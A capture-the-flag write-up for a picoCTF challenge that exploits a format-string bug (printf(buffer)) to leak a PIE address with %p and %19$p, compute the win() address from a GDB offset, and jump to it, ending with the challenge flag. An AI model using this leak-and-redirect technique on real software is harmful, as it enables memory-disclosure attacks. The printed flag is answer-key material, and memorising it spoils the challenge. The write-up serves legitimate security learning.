## 👉 Initial Reconnaissance 🔍
First, I downloaded the source and binary to understand what we're dealing with. Ran a quick test:

nc rescued-float.picoctf.net 56651\
Enter your name: a\
a\
enter the address to jump to, ex => 0x12345: b\
Segfault Occurred, incorrect address.

Looks familiar but slightly different from the previous PIE challenge! 🤔

## 👉 Source Code Analysis 📋
Opening the source code revealed the vulnerability:

void call_functions() {\
  char buffer[64];\
  printf("Enter your name:");\
  fgets(buffer, 64, stdin);\
  printf(buffer);  // 🚨 FORMAT STRING VULNERABILITY!

Classic format string bug - our input gets passed directly to printf() without proper format specifiers.

## 👉 Finding the Offset 📐
Used GDB to find the function addresses:

(gdb) disas main\
   0x0000555555555400 <+0>:	endbr64
   
(gdb) disas win\
   0x000055555555536a <+0>:	endbr64

So:\
main() is at 0x555555555400\
win() is at 0x55555555536a

Offset between them: 0x96 (150 in decimal)

This means if we leak main’s address during runtime, we can subtract the offset to calculate win

## 👉 The Challenge - PIE + Format String 🎲
Since PIE is enabled, addresses randomize on each run. Need to:

1. Use format string vulnerability to leak main() address
2. Calculate win() address using the offset
3. Jump to win() function

## 👉 Stack Walking for Address Leak 🕵️
Started testing format string positions:\
Enter your name: %p %p %p %p %p %p %p %p %p %p\
0x60a018e862a1 (nil) 0x60a018e862be 0x7ffde08b1690 0x7c ...

No main address yet. Tried with 20 format specifiers:\
Enter your name: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p\
0x593444b702a1 (nil) 0x593444b702dc 0x7ffde56b3b20 0x7c 0x71dfde3f9238 0x71dfde3eb6a0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x7f000a702520 0x59340848b1c0 0xa77175e5604c2900 0x7ffde56b3b80 ***0x59340848b441*** (nil)

The 19th position showed: 0x59340848b441\
This looked very similar to the GDB address pattern! Comparing:

GDB static: 0x0000555555555400\
Runtime leaked: 0x59340848b441

The last 3 digits were close - I could just change 441 to 400 to get the exact main address!

## 👉 Double-Check ✅
Disassembled main() again and confirmed this address format was correct. The leaked address was indeed pointing into the main function.

## 👉 Final Exploit 🚀
Fresh connection with targeted format string:\
Enter your name: %19$p\
[got main address]

## 👉 Calculation:
Change last 3 digits to 400 to get exact main address\
Subtract 0x96 to get win address\
Example: 0x59340848b400 - 0x96 = 0x59340848b36a

enter the address to jump to, ex => 0x12345: 0x59340848b36a\
You won!\
picoCTF{p13_5h0u1dn'7_134k_cdbb451d}
